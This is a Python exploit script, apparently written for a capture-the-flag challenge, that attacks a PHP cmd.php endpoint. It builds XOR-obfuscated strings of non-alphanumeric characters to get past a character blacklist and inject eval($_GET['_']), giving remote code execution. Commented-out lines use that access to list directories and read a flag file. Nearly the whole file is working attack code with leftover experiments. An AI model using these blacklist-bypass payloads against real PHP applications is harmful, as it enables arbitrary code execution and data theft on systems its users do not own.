import string,requests,math

def create_payload(strings=b""):
    all_key = b"&|\[]\"#$%\'()*+,-./:;<=>?^_{}`"
    all_key = b"!\"#$%&\'()*+,-./:;<=>?@[\]^_{|}`"
    gets = ""
    keys = ""
    result = {}

    for i in strings:
        for j in all_key: 
            for z in all_key:
                if z^j == i:                
                    gets += chr(j)  
                    keys += chr(z)
                    result[chr(i)] = ".".join(["('"+ gets[i] + "'" + f"^'{keys[i]}')" for i in range(len(gets))])          
                    gets = ""
                    keys = ""
                    break

    payloads = []
    blacklist = {'!':"('}'^'\\')","@":"('}'^'=')"}
    for i in strings:            
        try:
            payloads.append(result[chr(i)])
    
        except KeyError as e: 
            # if str(e) == "\\":
            #     payloads.append("\\\\")
            #     continue
            if str("!") in blacklist.keys:
                print(True)
                continue
            payloads.append(str(e))
        
    return ".".join(payloads).replace("\\","\\\\")

def change_int(integer=[28, 31, 30, 25, 24, 27, 26, 21, 20, 23, 22, 17, 16, 19, 18, 13, 12, 15, 14, 9, 8, 11, 10, 5, 4, 7]):
    angka_1 = "!!@'}'+"
    save = {}
    for i in integer:
        if i%2 == 0:
            # print(angka_1*int((i/2)))
            ganti = "(" + str(angka_1*int((i/2))) + ")" + "*(" + angka_1*2 + ")"
            save[i] = ganti.replace("+)",")")            
        else:
            ubah_genap = i - 1
            ganti = "(" + str(angka_1*int((i/2))) + ")" + "*(" + angka_1*2 + ")" + "+!!@'}'"
            save[i] = ganti.replace("+)",")")
    
    print("".join([ "(" + save[i] + "+^'}')" for i in save]))

def sending(payload):
    url = "http://localhost:6074/slashroot/cmd.php"
    payload = {"cmd" : payload}
    p = requests.post(url,data=payload).text
    return p
# def change_bin(strings="0110110001110011"):
#     angka_1 = "!!@'}'"
#     angka_0 = "(!!@'}'-!!@'}')"
#     payload_binner = []
#     for i in strings:
#         if i == '0':
#             payload_binner.append(angka_0)
#         else:
#             payload_binner.append(angka_1)
#     payload = ".".join(payload_binner)
#     print(sending(payload + ".'|'.('('^'[').('('^'@')"))

# payload2 = create_payload(b"var_dump(iterator_to_array(new RecursiveDirectoryIterator(new DirectoryIterator('./'))))")
# get_satu = create_payload(b"$_GET[") + ".(!!'}'-!!'}')." + create_payload(b"]")
# get_dua = create_payload(b"$_GET[") + ".(!!'}'-!!'}')." + create_payload(b"]")
# get_dua = create_payload(b"$_GET[") + ".(!!'}'-!!'}')." + create_payload(b"]")
# payload = "%28%27_%27%5E%27%29%27%29.%28%27_%27%5E%27%3E%27%29.%28%27_%27%5E%27-%27%29.%28%27%60%27%5E%27%3F%27%29.%28%27_%27%5E%27%3B%27%29.%28%27_%27%5E%27%2A%27%29.%28%27%40%27%5E%27-%27%29.%28%27_%27%5E%27%2F%27%29.%27%28%27.%28%27%40%27%5E%27%29%27%29.%28%27_%27%5E%27%2B%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%3E%27%29.%28%27_%27%5E%27%2B%27%29.%28%27%40%27%5E%27%2F%27%29.%28%27_%27%5E%27-%27%29.%28%27%60%27%5E%27%3F%27%29.%28%27_%27%5E%27%2B%27%29.%28%27%40%27%5E%27%2F%27%29.%28%27%60%27%5E%27%3F%27%29.%28%27_%27%5E%27%3E%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%3E%27%29.%28%27_%27%5E%27%26%27%29.%27%28%27.%28%27%40%27%5E%27.%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27%28%27%29.%28%27%60%27%5E%27%40%27%29.%28%27%7D%27%5E%27%2F%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27%3C%27%29.%28%27_%27%5E%27%2A%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%2C%27%29.%28%27%40%27%5E%27%29%27%29.%28%27_%27%5E%27%29%27%29.%28%27_%27%5E%27%3A%27%29.%28%27%60%27%5E%27%24%27%29.%28%27%40%27%5E%27%29%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27%3C%27%29.%28%27_%27%5E%27%2B%27%29.%28%27%40%27%5E%27%2F%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%26%27%29.%28%27%60%27%5E%27%29%27%29.%28%27_%27%5E%27%2B%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%3E%27%29.%28%27_%27%5E%27%2B%27%29.%28%27%40%27%5E%27%2F%27%29.%28%27_%27%5E%27-%27%29.%27%28%27.%28%27%40%27%5E%27.%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27%28%27%29.%28%27%60%27%5E%27%40%27%29.%28%27%60%27%5E%27%24%27%29.%28%27%40%27%5E%27%29%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27%3C%27%29.%28%27_%27%5E%27%2B%27%29.%28%27%40%27%5E%27%2F%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%26%27%29.%28%27%60%27%5E%27%29%27%29.%28%27_%27%5E%27%2B%27%29.%28%27_%27%5E%27%3A%27%29.%28%27_%27%5E%27-%27%29.%28%27_%27%5E%27%3E%27%29.%28%27_%27%5E%27%2B%27%29.%28%27%40%27%5E%27%2F%27%29.%28%27_%27%5E%27-%27%29.%27%28%27.%28%27%7B%27%5E%27%5C%5C%27%29.%27.%27.%27%2F%27.%28%27%7B%27%5E%27%5C%5C%27%29.%27%29%27.%27%29%27.%27%29%27.%27%29%27"
# print(payload2)
# exit()

# list dir
url = "http://localhost/cmd.php?_=$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$it->rewind();print_r(iterator_to_array($it));"

# read file
# url = "http://localhost:6074/slashroot/cmd.php?_=print_r(file('./z1n1_flagnya_om.txt'));"

# print(payload)
# exit()
# a = requests.post(url,data={"cmd": "('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';').(!!'}'-!!'}').('`'^'=').';'."}).text
# print(create_payload(b";"))
# exit()

# print(create_payload(b"]"))
# (('}'^'=')^')').(('}'^'=')^'-').('_'^'/').(('}'^'=')^',').(('}'^'=')^'/').('_'^';').('_'^':') -> implode
# blacklist = {'!':"('}'^'\\')","@":"('}'^'=')"}
# exit() 
payload = create_payload(b"eva") + ".((',')^('}'^'='))" + ".'('.('{'^'_').('`'^'?').('`'^'\\'').('`'^'%').('}'^')').('`'^';')." + "'\\'_\\''" + ".('`'^'=').')'" # -> eval($_GET['_'].';')
a = requests.post(url,data={"cmd": payload}).text
print(a)
